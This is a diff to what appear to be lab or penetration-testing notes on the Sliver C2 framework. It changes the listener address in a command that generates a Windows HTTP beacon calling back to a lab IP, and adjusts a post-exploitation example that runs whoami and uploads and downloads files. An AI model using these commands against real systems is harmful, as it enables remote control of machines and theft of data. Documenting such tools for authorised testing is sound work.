@@ -6,7 +6,7 @@ sliver-server
 ```
 - generate a beacon
 ```shell-session
-generate beacon --http 10.10.14.62:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save <directory>
+generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save <directory>
 ```
 - generate an implant
 ```shell-session
@@ -259,7 +259,7 @@ The Sliver C2 framework is a powerful and flexible post-exploitation command and
 
 5. **Perform post-exploitation activities** (e.g., uploading/downloading files, executing commands):
    ```bash
-   shell whoami
+   whoami
    upload C:\local\file.txt C:\remote\file.txt
    download C:\remote\file.txt C:\local\file.txt
    ```
